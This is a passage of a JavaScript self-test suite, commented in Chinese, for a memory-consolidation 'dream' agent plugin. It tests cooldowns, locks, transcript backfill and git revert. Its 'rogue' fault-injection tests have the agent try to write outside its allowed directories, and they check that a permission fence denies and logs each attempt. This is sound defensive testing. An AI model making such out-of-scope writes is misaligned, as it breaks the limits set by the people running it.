  const m4Candidate = m4s.find((f) => f.detail.entity === 'never-existed-file.txt');
  const m4Confirmed = m4s.find((f) => f.detail.entity === 'doomed.txt');
  check('M4 候选级：never-existed-file.txt 检出为 candidate', m4Candidate?.evidenceLevel === 'candidate', JSON.stringify(m4s.map((f) => f.detail)));
  check('M4 确凿级：doomed.txt 检出为 confirmed（git 讣告在案）', m4Confirmed?.evidenceLevel === 'confirmed', JSON.stringify(m4Confirmed?.detail));
  check('M4 确凿级证据携带讣告路径', m4Confirmed?.detail.obituary === 'doomed.txt');
  check(
    'M4 命中场景零误报（存在实体/命令句/URL/单蹦词均不产生 finding）',
    !m4s.some((f) => ['healthy-a', 'url-noise', 'generic-word', 'healthy-b', 'healthy-d'].includes(f.object)),
    JSON.stringify(m4s.map((f) => f.object))
  );
  // 总数恰为 3：broken-link 的 missing/path.md（路径形断链目标同时也是 M4 实体，0 命中无讣告
  // → 候选——M1 与 M4 各自看到同一引用是真实行为，处置层合并处理）+ 候选 never-existed-file.txt
  // + 确凿 doomed.txt。
  check(
    'M4 检出总数恰为 3（两候选一确凿，无其他实体漏进）',
    m4s.length === 3 && m4s.filter((f) => f.evidenceLevel === 'candidate').length === 2 && m4s.filter((f) => f.evidenceLevel === 'confirmed').length === 1,
    JSON.stringify(m4s.map((f) => `${f.object}:${f.detail.entity}:${f.evidenceLevel}`))
  );

  // M5：双向对账，两个方向都检出且标 auto_fixable
  const m5s = byId('M5');
  check('M5 幽灵索引行检出（ghost-index.md，auto_fixable）', m5s.some((f) => f.detail.direction === 'indexed-but-missing-on-disk' && f.detail.file === 'ghost-index.md' && f.autoFixable === true), JSON.stringify(m5s.map((f) => f.detail)));
  check('M5 漏索引检出（unindexed-memory.md，auto_fixable）', m5s.some((f) => f.detail.direction === 'on-disk-but-missing-in-index' && f.object === 'unindexed-memory.md' && f.autoFixable === true), JSON.stringify(m5s.map((f) => f.detail)));

  // 执行日志：命令类与代码类证据都有记录，落盘可查
  const logContent = existsSync(logFile) ? readFileSync(logFile, 'utf8') : '';
  check('执行日志落盘（C2 数据源）', existsSync(logFile));
  check('执行日志含真实命令记录（git grep）', logContent.includes('git grep'));
  check('执行日志含讣告查询记录（git log --diff-filter=D）', logContent.includes('--diff-filter=D'));
  check('每条 finding 带证据引用（ts + kind）', findings.every((f) => f.evidence && typeof f.evidence.ts === 'string' && f.evidence.kind), JSON.stringify(findings.find((f) => !f.evidence)?.id));

  sandboxes.push(root);

  // ---- 2) 小库沙箱：M2 冷启动禁用（R3） ----
  const smallRoot = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-checksmall-'));
  git(smallRoot, ['init', '-q']);
  git(smallRoot, ['config', 'user.email', 'test@example.com']);
  git(smallRoot, ['config', 'user.name', 'claude-dream self-test']);
  writeFileSync(path.join(smallRoot, 'CLAUDE.md'), '# Small Sandbox\n', 'utf8');
  git(smallRoot, ['add', '-A']);
  git(smallRoot, ['commit', '-q', '-m', 'init']);
  const smallMemDir = path.join(smallRoot, '.claude', 'memory');
  mkdirSync(smallMemDir, { recursive: true });
  plantMemory(smallMemDir, 'small-1', { body: '小库记忆一，无链接。' });
  plantMemory(smallMemDir, 'small-2', { body: '小库记忆二，无链接。' });
  plantIndex(smallMemDir, ['small-1', 'small-2'].map((s) => ({ slug: s, label: s })));
  const smallResult = runMechanicalChecks({ root: smallRoot, paths: dreamPaths(smallRoot), exec: createEngineLog({}) });
  check('R3 冷启动保护：库存 <15 时 M2 整条禁用（meta 如实入报告）', smallResult.meta.m2Disabled === true, smallResult.meta.m2DisabledReason);
  check('R3 冷启动保护：禁用状态下零 M2 检出', smallResult.findings.filter((f) => f.id === 'M2').length === 0);
  check('R3 冷启动保护：禁用原因写明库存数', smallResult.meta.m2DisabledReason.includes('2 条'), smallResult.meta.m2DisabledReason);
  sandboxes.push(smallRoot);
}

async function testFullChainAndRevertAndCooldownAndRecursion() {
  const sandbox = makeSandbox('chain');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== 全链路 + revert + 冷却 + 防递归（沙箱: ${sandbox}） ===`);

  // 1) 防递归：CLAUDE_INVOKED_BY 已设置时，hook 必须直接 no-op，不落标记、不拉梦。
  runNode(path.join(SRC, 'session-end.mjs'), [], {
    cwd: sandbox,
    stdinJson: sessionEndPayload(sandbox, 'chain'),
    env: { [RECURSION_GUARD_ENV]: RECURSION_GUARD_VALUE },
  });
  check('AC4 防递归：设了 CLAUDE_INVOKED_BY 时不落触发标记', !existsSync(paths.sessionEndMarker));

  // 2) 正常 SessionEnd：应落标记、detached 拉起分离进程、最终跑完一场梦。
  const before = Date.now();
  const sessionEndRun = runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: sessionEndPayload(sandbox, 'chain') });
  check('SessionEnd hook 本身快速退出（不等梦跑完）', sessionEndRun.status === 0);
  check('AC2 触发标记已落盘', existsSync(paths.sessionEndMarker));

  const dreamDone = await waitFor(() => {
    if (!existsSync(paths.lastDreamState)) return false;
    const state = JSON.parse(readFileSync(paths.lastDreamState, 'utf8'));
    return state.status && state.status !== 'running' && new Date(state.lastDreamAt).getTime() >= before;
  });
  check('分离进程确实跑完一场梦（last-dream.json 落地 completed/failed）', dreamDone);

  // PBI-01.1：底片压缩在 trigger-check.mjs 里先于拉梦逻辑同步跑完（定序），dreamDone 为真时
  // 底片这一步必然也已经跑过——不需要另外等。
  const negChainSessionId = sandboxSessionId('chain');
  const negLedgerPath = paths.negativeLedger;
  const negLedger = existsSync(negLedgerPath) ? JSON.parse(readFileSync(negLedgerPath, 'utf8')) : {};
  const negRecord = negLedger[negChainSessionId];
  check('PBI-01.1·AC1 台账记录了本场会话的底片', !!negRecord, JSON.stringify(negLedger));
  const negPageFile = negRecord?.pages?.[0]?.file;
  const negPagePath = negPageFile ? path.join(paths.negativesDir, negPageFile) : null;
  check('PBI-01.1·AC1 底片文件确实落盘、一场一文件、可寻址（文件名含 session id）', negPagePath && existsSync(negPagePath) && negPageFile.startsWith(negChainSessionId));
  if (negPagePath && existsSync(negPagePath)) {
    const negContent = readFileSync(negPagePath, 'utf8');
    check(
      'PBI-01.2·AC3 裁决回程有名分：埋的标记话能在底片里按原文检索到',
      negContent.includes(sandboxMarker('chain'))
    );
  }

  const lastState = existsSync(paths.lastDreamState) ? JSON.parse(readFileSync(paths.lastDreamState, 'utf8')) : null;
  check('梦跑完状态是 completed（不是 failed）', lastState?.status === 'completed', JSON.stringify(lastState?.summary?.sdkError ?? ''));

  const runId = lastState?.summary?.runId;
  const placeholderPath = runId ? path.join(sandbox, '.claude', 'memory', `dream-placeholder-${runId}.md`) : null;
  check('PBI-04.3·AC1 占位整合：新记忆文件确实落盘', runId && existsSync(placeholderPath));

  const memoryIndex = existsSync(paths.memoryIndex) ? readFileSync(paths.memoryIndex, 'utf8') : '';
  check('MEMORY.md 索引行已回补指向新文件', runId && memoryIndex.includes(`dream-placeholder-${runId}`));
  check('MEMORY.md 未被写入正文内容（仍保持纯指针索引，行数受控）', memoryIndex.split('\n').length < 20, `实际行数=${memoryIndex.split('\n').length}`);

  // DoD·D2：不破坏官方 auto-memory 契约——一记一文件，且新记忆文件本身要有规范 frontmatter。
  if (placeholderPath && existsSync(placeholderPath)) {
    const placeholderContent = readFileSync(placeholderPath, 'utf8');
    const hasFrontmatter = /^---\r?\nname: [\s\S]+?\r?\ndescription: [\s\S]+?metadata:\r?\n\s+type: \w+\r?\n---/.test(placeholderContent);
    check('DoD·D2 新记忆文件带规范 frontmatter（name/description/metadata.type）', hasFrontmatter, placeholderContent.slice(0, 200));
  }
  check('DoD·D2 既有记忆文件未被占位引擎动过', existsSync(path.join(sandbox, '.claude', 'memory', 'existing-fact.md')));
  if (existsSync(path.join(sandbox, '.claude', 'memory', 'existing-fact.md'))) {
    const existingContent = readFileSync(path.join(sandbox, '.claude', 'memory', 'existing-fact.md'), 'utf8');
    check('既有记忆内容原样未改', existingContent.includes('沙箱预置内容，供测试对照，不应被占位引擎动到。'));
  }

  const reportPath = runId ? path.join(sandbox, '.claude', 'dream', `${runId}-report.md`) : null;
  check('PBI-04.3·AC2 梦报告已落盘', runId && existsSync(reportPath));
  if (reportPath && existsSync(reportPath)) {
    const report = readFileSync(reportPath, 'utf8');
    const sixSections = ['图 delta 对账', '30 秒版', '明细', '隔离观察区', '抽查点', '阀门状态'];
    check('梦报告六节骨架齐全', sixSections.every((s) => report.includes(s)), sixSections.filter((s) => !report.includes(s)).join(','));

    // PBI-01.2·AC1：进料对账须包含触发本次梦的那场会话的底片，session id 对得上——
    // 这里的 sandboxSessionId('chain') 就是本场触发 session-end.mjs 的那个 session_id，
    // 断言报告文本里能看到它、且明确写着"已读到"（不是含糊带过）。
    check('PBI-01.2·AC1 进料对账行出现在报告里', report.includes('进料对账'));
    check('PBI-01.2·AC1 进料对账含触发会话 session id', report.includes(sandboxSessionId('chain')));
    check('PBI-01.2·AC1 进料对账明确写着已读到底片', report.includes('已读到'));
  }

  const logPath = runId ? path.join(sandbox, '.claude', 'dream', `${runId}-canUseTool.log`) : null;
  check('PBI-04.2·AC2 canUseTool 裁决日志已落盘', runId && existsSync(logPath));
  let invocations = [];
  if (logPath && existsSync(logPath)) {
    invocations = readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
  }
  check('canUseTool 确实被调用过（至少一次裁决记录）', invocations.length > 0, `count=${invocations.length}`);
  check('至少一次 allow（占位记忆的 Write 落盘）', invocations.some((i) => i.decision === 'allow'));

  const log = git(sandbox, ['log', '--oneline']);
  check('PBI-04.3·AC3 存在 dream: 前缀提交', /\bdream: /.test(log), log);
  check('report/log 证据另笔提交（dream-evidence:），不与记忆改动混在一笔', /\bdream-evidence: /.test(log), log);
  check('commitResults 没有报 dreamError/evidenceError（正常路径应该干净）', !lastState?.summary?.commits?.dreamError && !lastState?.summary?.commits?.evidenceError);

  // D3 review 抓到的坑修复验证：last-dream.json/session-end-marker.json 是纯运行态，
  // 不该出现在任何一笔提交的树里——否则 evidence 提交会永久记录一份"这场梦还在跑"的假状态。
  const evidenceSha = lastState?.summary?.commits?.evidence;
  if (evidenceSha) {
    const showLastDream = spawnSync('git', ['show', `${evidenceSha}:.claude/dream/last-dream.json`], { cwd: sandbox, encoding: 'utf8', windowsHide: true });
    check('last-dream.json 没有被 evidence 提交收进去（应该在该提交树里查不到）', showLastDream.status !== 0);
  }
  const preSha = git(sandbox, ['log', '--oneline', '--grep=^dream-pre:', '-1', '--format=%H']);
  if (preSha) {
    const showMarkerInPre = spawnSync('git', ['show', `${preSha}:.claude/dream/session-end-marker.json`], { cwd: sandbox, encoding: 'utf8', windowsHide: true });
    check('session-end-marker.json 没有被 dream-pre 快照收进去', showMarkerInPre.status !== 0);
  }
  check('AC4 下次会话提示行载体已落盘', existsSync(paths.promptCarrier));

  // 3) revert 验证：dream: 提交应可单独撤销，且不影响 evidence 提交里的报告/日志。
  const dreamSha = git(sandbox, ['log', '--oneline', '--grep=^dream:', '-1', '--format=%H']);
  let revertOk = false;
  if (dreamSha) {
    const revertResult = spawnSync('git', ['revert', '--no-edit', dreamSha], { cwd: sandbox, encoding: 'utf8', windowsHide: true });
    revertOk = revertResult.status === 0;
  }
  check('PBI-04.3·AC3 git revert 单独回滚 dream: 提交成功', revertOk);
  check('revert 后占位记忆文件消失', runId && !existsSync(placeholderPath));
  check('revert 后报告文件依然在（证据没被一起销毁，对应 verdict C7）', runId && existsSync(reportPath));

  // 4) 冷却期验证：紧接着再触发一次 SessionEnd，默认 30 分钟冷却内不应该再跑一场梦。
  const stateBeforeSecondTrigger = readFileSync(paths.lastDreamState, 'utf8');
  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: sessionEndPayload(sandbox, 'chain') });
  await new Promise((r) => setTimeout(r, 3000)); // 给 detached 分离进程足够时间跑到冷却判断那一步
  const stateAfterSecondTrigger = readFileSync(paths.lastDreamState, 'utf8');
  check('AC3 冷却期内不重复触发（last-dream.json 未被再次改写）', stateBeforeSecondTrigger === stateAfterSecondTrigger);

  // 同一次触发也把底片幂等一并验了：逐字稿没变，重复 SessionEnd 不该多出第二页。
  const negLedgerAfterRetrigger = existsSync(negLedgerPath) ? JSON.parse(readFileSync(negLedgerPath, 'utf8')) : {};
  const negPagesAfterRetrigger = negLedgerAfterRetrigger[negChainSessionId]?.pages ?? [];
  check('PBI-01.1·AC1 幂等：逐字稿未变时重复触发不产生第二页底片', negPagesAfterRetrigger.length === 1, `pages=${negPagesAfterRetrigger.length}`);

  // 5) SessionStart 消费提示行。
  const startResult = runNode(path.join(SRC, 'session-start.mjs'), [], { cwd: sandbox, stdinJson: { cwd: sandbox } });
  check('PBI-04.3·AC4 下次会话开场输出一行提示', startResult.stdout.trim().length > 0, startResult.stdout.trim());
  check('提示行载体读一次后被消费', !existsSync(paths.promptCarrier));

  return sandbox;
}

async function testNegativesFaultInjection() {
  // AC5（守卫类，D4 点烟）：写失败时静默降级、不阻塞散会链路；错误留痕落点在底片目录之外。
  // 真造一次写失败（环境变量注入开关），亲眼看降级与留痕——不是读代码猜它"应该"没事。
  const sandbox = makeSandbox('fault');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== PBI-01.1·AC5 底片写失败故障注入（D4 点烟），沙箱: ${sandbox} ===`);

  const before = Date.now();
  runNode(path.join(SRC, 'session-end.mjs'), [], {
    cwd: sandbox,
    stdinJson: sessionEndPayload(sandbox, 'fault'),
    env: { CLAUDE_DREAM_NEGATIVES_INJECT_WRITE_FAILURE: 'true' },
  });

  const dreamDone = await waitFor(() => {
    if (!existsSync(paths.lastDreamState)) return false;
    const state = JSON.parse(readFileSync(paths.lastDreamState, 'utf8'));
    return state.status && state.status !== 'running' && new Date(state.lastDreamAt).getTime() >= before;
  });
  check('AC5 底片写失败不阻塞散会链路：梦依然正常跑完', dreamDone);
  const lastState = existsSync(paths.lastDreamState) ? JSON.parse(readFileSync(paths.lastDreamState, 'utf8')) : null;
  check('梦本身状态 completed（底片故障没有连带搞垮拉梦逻辑）', lastState?.status === 'completed');

  const negLedger = existsSync(paths.negativeLedger) ? JSON.parse(readFileSync(paths.negativeLedger, 'utf8')) : {};
  check('AC5 红：注入生效时确实没有产出底片页（台账里没有这个 session 的记录）', !negLedger[sandboxSessionId('fault')]);
  const negFilesAfterFault = existsSync(paths.negativesDir) ? readdirSync(paths.negativesDir) : [];
  check('AC5 红：底片目录里没有产出任何 .md 页面（目录本身可能因 mkdir 而存在，但不该有页面）', !negFilesAfterFault.some((f) => f.endsWith('.md')), JSON.stringify(negFilesAfterFault));

  check('AC5 错误留痕落点确实在底片目录之外', existsSync(paths.negativeErrorTrace) && path.dirname(paths.negativeErrorTrace) !== paths.negativesDir);
  if (existsSync(paths.negativeErrorTrace)) {
    const trace = readFileSync(paths.negativeErrorTrace, 'utf8');
    check('错误留痕内容包含注入失败的原因', trace.includes('CLAUDE_DREAM_NEGATIVES_INJECT_WRITE_FAILURE'));
  }

  return sandbox;
}

async function testBackfillNegatives() {
  // PBI-01.1·AC6：漏网场补捞。CLAUDE_CONFIG_DIR 指向临时目录，不碰真实 ~/.claude/projects/
  // （沙箱纪律：不碰本仓库真实 .claude/，这里连全局 ~/.claude/ 都不能碰）。
  console.log('\n=== PBI-01.1·AC6 漏网场补捞（D4 点烟：真造一场无结束事件的会话） ===');

  const { backfillNegatives } = await import(pathToFileURL(path.join(SRC, 'negatives', 'backfill.mjs')).href);

  const prevConfigDir = process.env.CLAUDE_CONFIG_DIR;
  const configDir = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-backfill-config-'));
  const root = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-backfill-root-'));

  try {
    process.env.CLAUDE_CONFIG_DIR = configDir;
    const encoded = root.replace(/[^a-zA-Z0-9]/g, '-');
    const transcriptsDir = path.join(configDir, 'projects', encoded);
    mkdirSync(transcriptsDir, { recursive: true });

    const writeFakeTranscript = (sessionId, text, cwd) => {
      const p = path.join(transcriptsDir, `${sessionId}.jsonl`);
      const entry = { type: 'user', message: { role: 'user', content: [{ type: 'text', text }] } };
      if (cwd !== undefined) entry.cwd = cwd;
      writeFileSync(p, JSON.stringify(entry) + '\n', 'utf8');
      return p;
    };

    // 场景①：一场真实的、够旧的、没触发过 SessionEnd 的会话——这是 AC6 要补的主角。
    const missedId = 'missed-session-1';
    const missedPath = writeFakeTranscript(missedId, 'BACKFILL-MARKER-missed');
    const oldTime = new Date(Date.now() - 60 * 60 * 1000);
    utimesSync(missedPath, oldTime, oldTime);

    // 场景②：梦自己的会话，登记进 dreamSessionIdsLog——AC6①必须排除，不能自吞。
    const dreamId = 'dream-own-session-1';
    const dreamTranscriptPath = writeFakeTranscript(dreamId, '不该被压成底片');
    utimesSync(dreamTranscriptPath, oldTime, oldTime);
    mkdirSync(path.join(root, '.claude', 'dream'), { recursive: true });
    writeFileSync(path.join(root, '.claude', 'dream', 'dream-session-ids.log'), dreamId + '\n', 'utf8');

    // 场景③：mtime 是刚刚——大概率还在进行中的活会话，AC6②不得误冻。
    const activeId = 'active-session-1';
    writeFakeTranscript(activeId, '还在打字');

    // 场景④（D3 review 抓到的坑）：目录编码规则是官方文档确认的多对一映射（非字母数字字符
    // 全替换成 -），两个不同的真实路径可能编码到同一个 <projects>/<encoded>/ 目录——这里
    // 模拟"同目录、但 cwd 字段记录的是另一个项目"，验证跨项目内容不会被误当成本项目的会话
    // 压缩进本项目的底片目录（底片目录本就是因为涉隐私才特意排除入库的，泄漏更糟）。
    const collisionId = 'collision-session-1';
    const collisionPath = writeFakeTranscript(collisionId, '这其实是另一个项目的会话内容', 'C:\\SomeOtherProject-NotRoot');
    utimesSync(collisionPath, oldTime, oldTime);

    const summary = await backfillNegatives({ root });
    const byId = Object.fromEntries((summary.results ?? []).map((r) => [r.sessionId, r.status]));

    check('AC6 补捞：漏网会话确实产出底片（status=written）', byId[missedId] === 'written', JSON.stringify(byId));
    check('AC6① 排除梦会话：梦自己的逐字稿被跳过、没压成底片', byId[dreamId] === 'skipped-dream-session');
    check('AC6② 活稿判别：mtime 太新的会话没被误冻', byId[activeId] === 'skipped-active');
    check('D3 修复：目录编码碰撞——cwd 对不上的逐字稿被跳过，不跨项目泄漏', byId[collisionId] === 'skipped-cwd-mismatch', JSON.stringify(byId));

    const ledgerPath = path.join(root, '.claude', 'negatives', 'ledger.json');
    const ledger = existsSync(ledgerPath) ? JSON.parse(readFileSync(ledgerPath, 'utf8')) : {};
    check('梦会话没有留下台账记录', !ledger[dreamId]);
    check('活会话没有留下台账记录', !ledger[activeId]);
    check('D3 修复：cwd 不匹配的会话没有留下台账记录、没有产出底片文件', !ledger[collisionId]);

    // 验收打回抓到的坑（回归钉子）：ledger 原子写的 tmp 文件曾经落在 negativeDir 里，外部把
    // negativeDir 当"稳定内容"目录去枚举时可能撞见这个瞬时文件，下一刻再开它就 ENOENT。
    // 验证写完之后 negativeDir 目录枚举里干干净净、没有任何 .tmp 残留，且 tmp 目录确实换成了
    // negativeDir 的同级兄弟目录（证明走的是新机制，不是巧合没撞上）。
    const filesInNegativesDir = readdirSync(path.dirname(ledgerPath));
    check('验收打回修复：negativeDir 目录枚举里不出现任何 .tmp 残留文件', !filesInNegativesDir.some((f) => f.endsWith('.tmp')), JSON.stringify(filesInNegativesDir));
    const negativesTmpSiblingDir = path.join(root, '.claude', '.negatives-tmp');
    check('验收打回修复：ledger 原子写的 tmp 目录确实换成了 negativeDir 的同级兄弟目录', existsSync(negativesTmpSiblingDir));

    const missedPage = ledger[missedId]?.pages?.[0]?.file;
    if (missedPage) {
      const pageContent = readFileSync(path.join(root, '.claude', 'negatives', missedPage), 'utf8');
      check('补捞产出的底片能按原文检索到标记话', pageContent.includes('BACKFILL-MARKER-missed'));
    }

    // AC6③ 补捞可重入：再跑一遍，漏网会话不该产生第二页。D3 review 第二轮起：走的是字节数
    // 短路（ledger.lastProcessedBytes 命中），不是旧的整读判定——状态字符串换成
    // skipped-no-new-by-size，专门证明短路真的生效了，不是碰巧殊途同归。
    const summary2 = await backfillNegatives({ root });
    const byId2 = Object.fromEntries((summary2.results ?? []).map((r) => [r.sessionId, r.status]));
    check('AC6③ 补捞可重入：再跑一遍不产生第二页（幂等，命中字节数短路）', byId2[missedId] === 'skipped-no-new-by-size', JSON.stringify(byId2));

    // D3 review 第二轮安全网：短路判据本身不能反过来吃掉真实的新内容。往同一份逐字稿追加
    // 一行新内容（模拟"补捞过一次之后这场会话又有新动静"），字节数必然变了，第三次跑
    // 不能再命中短路，必须老老实实整读、产出第二页、新内容一字不少。
    appendFileSync(missedPath, JSON.stringify({ type: 'user', message: { role: 'user', content: [{ type: 'text', text: 'BACKFILL-MARKER-grown-after-shortcut' }] } }) + '\n', 'utf8');
    utimesSync(missedPath, oldTime, oldTime); // 追加会把 mtime 刷新成"现在"，改回旧时间让它还是活稿判别里的"够旧"候选
    const summary3 = await backfillNegatives({ root });
    const byId3 = Object.fromEntries((summary3.results ?? []).map((r) => [r.sessionId, r.status]));
    check('D3 安全网：字节数变化后短路不会误判，重新走完整路径', byId3[missedId] === 'written', JSON.stringify(byId3));
    const ledgerAfterGrowth = JSON.parse(readFileSync(ledgerPath, 'utf8'));
    const secondPage = ledgerAfterGrowth[missedId]?.pages?.[1]?.file;
    check('D3 安全网：追加的新内容确实产出了第二页', Boolean(secondPage), JSON.stringify(ledgerAfterGrowth[missedId]));
    if (secondPage) {
      const secondPageContent = readFileSync(path.join(root, '.claude', 'negatives', secondPage), 'utf8');
      check('D3 安全网：第二页能按原文检索到追加的新标记话，没有被短路吃掉', secondPageContent.includes('BACKFILL-MARKER-grown-after-shortcut'));
    }

    // AC6④：逐字稿已被清理——记账跳过、不报错。直接构造一个不存在的 transcript_path 场景，
    // 复用 processSessionTranscript（backfill 与 session-end 共用同一条编排逻辑）。
    const { processSessionTranscript } = await import(pathToFileURL(path.join(SRC, 'negatives', 'write-negative.mjs')).href);
    const cleanedUpResult = await processSessionTranscript({
      root,
      sessionId: 'already-cleaned-up-session',
      transcriptPath: path.join(root, 'does-not-exist-anymore.jsonl'),
    });
    check('AC6④ 逐字稿已被官方清理：记账跳过、不报错', cleanedUpResult.status === 'skipped-missing-transcript', JSON.stringify(cleanedUpResult));

    // 验收打回抓到的坑：backfill 需要接受显式 transcriptsDir 覆盖，供验收考场重定向到自备的
    // 沙箱逐字稿目录，不依赖 root 反推编码目录名。这里用一个跟 root 编码结果完全对不上的
    // 独立目录验证：只传 transcriptsDir 也能扫到并处理里面的会话，且回显的扫描目录对得上。
    const overrideTranscriptsDir = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-backfill-override-'));
    try {
      const overrideId = 'override-session-1';
      const overridePath = path.join(overrideTranscriptsDir, `${overrideId}.jsonl`);
      writeFileSync(overridePath, JSON.stringify({ type: 'user', message: { role: 'user', content: [{ type: 'text', text: 'BACKFILL-MARKER-transcriptsDir-override' }] } }) + '\n', 'utf8');
      utimesSync(overridePath, oldTime, oldTime);

      const overrideSummary = await backfillNegatives({ root, transcriptsDir: overrideTranscriptsDir });
      const byIdOverride = Object.fromEntries((overrideSummary.results ?? []).map((r) => [r.sessionId, r.status]));
      check('验收打回修复：backfill 的 transcriptsDir 覆盖参数确实生效（扫的是显式目录，不是编码推导目录）', byIdOverride[overrideId] === 'written', JSON.stringify(byIdOverride));
      check('验收打回修复：transcriptsDir 覆盖后回显的扫描目录对得上传入值', overrideSummary.transcriptsDir === overrideTranscriptsDir, overrideSummary.transcriptsDir);
    } finally {
      rmSync(overrideTranscriptsDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
    }

    // 第二轮验收实锤的真回归：commands.sessionEnd 内部顺带触发的补捞没有 CLI flag 通道可用，
    // 必须靠环境变量重定向——这里直接模拟那个场景：不传 transcriptsDir 参数（就像
    // trigger-check.mjs 现有调用 backfillNegatives({root}) 那样），只设环境变量。夹具的
    // cwd 字段故意写成跟 root 不一样的值，顺带验证「显式指定扫描目录时 cwd-mismatch 守卫
    // 应该被跳过」——如果守卫没被正确跳过，这条会话会被误判成 skipped-cwd-mismatch 而不是
    // written，测试能抓到；上面场景②的 collision-session-1（自动推导模式）不受影响，仍应
    // 触发 skipped-cwd-mismatch，证明原有防跨项目泄漏能力没被一起弄丢。
    const envOverrideTranscriptsDir = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-self-test-backfill-envoverride-'));
    const prevTranscriptsDirEnv = process.env.CLAUDE_DREAM_BACKFILL_TRANSCRIPTS_DIR;
    try {
      const envOverrideId = 'env-override-session-1';
      const envOverridePath = path.join(envOverrideTranscriptsDir, `${envOverrideId}.jsonl`);
      const mismatchedCwd = 'C:\\SomeOtherProject-NotRoot-EnvOverrideCase';
      writeFileSync(
        envOverridePath,
        JSON.stringify({ type: 'user', cwd: mismatchedCwd, message: { role: 'user', content: [{ type: 'text', text: 'BACKFILL-MARKER-env-transcripts-dir-override' }] } }) + '\n',
        'utf8'
      );
      utimesSync(envOverridePath, oldTime, oldTime);

      process.env.CLAUDE_DREAM_BACKFILL_TRANSCRIPTS_DIR = envOverrideTranscriptsDir;
      const envOverrideSummary = await backfillNegatives({ root }); // 故意不传 transcriptsDir 参数，模拟 sessionEnd 内部调用
      const byIdEnvOverride = Object.fromEntries((envOverrideSummary.results ?? []).map((r) => [r.sessionId, r.status]));
      check('验收打回修复：CLAUDE_DREAM_BACKFILL_TRANSCRIPTS_DIR 环境变量在无显式参数时也能生效（模拟 sessionEnd 内部补捞）', byIdEnvOverride[envOverrideId] === 'written', JSON.stringify(byIdEnvOverride));
      check('验收打回修复：环境变量覆盖模式下 cwd-mismatch 守卫被正确跳过，不误吞合法夹具', byIdEnvOverride[envOverrideId] !== 'skipped-cwd-mismatch', JSON.stringify(byIdEnvOverride));
    } finally {
      if (prevTranscriptsDirEnv === undefined) delete process.env.CLAUDE_DREAM_BACKFILL_TRANSCRIPTS_DIR;
      else process.env.CLAUDE_DREAM_BACKFILL_TRANSCRIPTS_DIR = prevTranscriptsDirEnv;
      rmSync(envOverrideTranscriptsDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
    }
  } finally {
    if (prevConfigDir === undefined) delete process.env.CLAUDE_CONFIG_DIR;
    else process.env.CLAUDE_CONFIG_DIR = prevConfigDir;
    rmSync(configDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
    rmSync(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
  }
}

async function testConcurrentTriggerLock() {
  // D3 review 抓到的坑：原来的"锁"是 check-then-write，靠得够近的两次 SessionEnd 能一起穿过冷却期检查、
  // 都去跑梦。这里真刀真枪触发两次几乎同时的 SessionEnd（不等第一次的 detached 子进程跑完），
  // 断言最终只有一场梦真正跑完、只留一笔 dream: 提交——不是"大概率不会撞上"，是结构上不可能同时通过。
  const sandbox = makeSandbox('concurrent');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== 并发触发防重（锁），沙箱: ${sandbox} ===`);

  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: sessionEndPayload(sandbox, 'concurrent') });
  runNode(path.join(SRC, 'session-end.mjs'), [], { cwd: sandbox, stdinJson: sessionEndPayload(sandbox, 'concurrent') });

  const settled = await waitFor(() => {
    if (!existsSync(paths.lastDreamState)) return false;
    const state = JSON.parse(readFileSync(paths.lastDreamState, 'utf8'));
    return state.status && state.status !== 'running' && !existsSync(paths.lockFile);
  });
  check('两次几乎同时的 SessionEnd 最终都落定（锁释放、状态不再是 running）', settled);

  const dreamCommitCount = (git(sandbox, ['log', '--oneline', '--grep=^dream:']).match(/^\S+ dream:/gm) ?? []).length;
  check('只有一笔 dream: 提交，不是两笔并发跑出来的两笔', dreamCommitCount === 1, `实际 ${dreamCommitCount} 笔`);

  return sandbox;
}

async function testRogue() {
  const sandbox = makeSandbox('rogue');
  console.log(`\n=== 故障注入 rogue 模式（沙箱: ${sandbox}） ===`);

  const result = runNode(path.join(SRC, 'run-dream.mjs'), ['--rogue', sandbox], { cwd: sandbox });
  check('rogue 模式跑完退出码为 0（越界被拒不算梦失败）', result.status === 0, result.stderr);

  let summary = null;
  try {
    summary = JSON.parse(result.stdout);
  } catch {
    // ignore
  }
  check('rogue 输出包含可解析的 summary', !!summary, result.stdout.slice(0, 300));

  const roguePath = path.join(sandbox, 'ROGUE-TARGET.md');
  check('①故障注入入口：越界文件确实没有落盘（围栏拦下了）', !existsSync(roguePath));
  check('summary.rogueBlocked 为 true', summary?.rogueBlocked === true);

  if (summary?.runId) {
    const logPath = path.join(sandbox, '.claude', 'dream', `${summary.runId}-canUseTool.log`);
    const invocations = existsSync(logPath)
      ? readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l))
      : [];
    check(
      'canUseTool 日志里有一条针对 ROGUE-TARGET.md 的 deny',
      invocations.some((i) => i.decision === 'deny' && i.input?.file_path?.includes('ROGUE-TARGET.md'))
    );
    check(
      '验收打回修复：日志条目的顶层 targetPath 字段也能独立定位到被拒路径',
      invocations.some((i) => i.decision === 'deny' && typeof i.targetPath === 'string' && i.targetPath.includes('ROGUE-TARGET.md'))
    );
  }

  return sandbox;
}

async function testRogueTargetsNegativesDir() {
  // PBI-01.2·AC2（守卫类，D4 点烟）：梦对底片零写权。canUseTool 白名单结构上不含
  // negativesDir（scope-guard.mjs 的 judgePath 只认 memory/dream/CLAUDE.md 三处），
  // 这里不是读代码猜"应该拒绝"，是真让作恶模式指向 .claude/negatives/ 里的具体文件，
  // 亲眼看它被拒、且拒绝日志里能看到这个路径。
  const sandbox = makeSandbox('rogue-negatives');
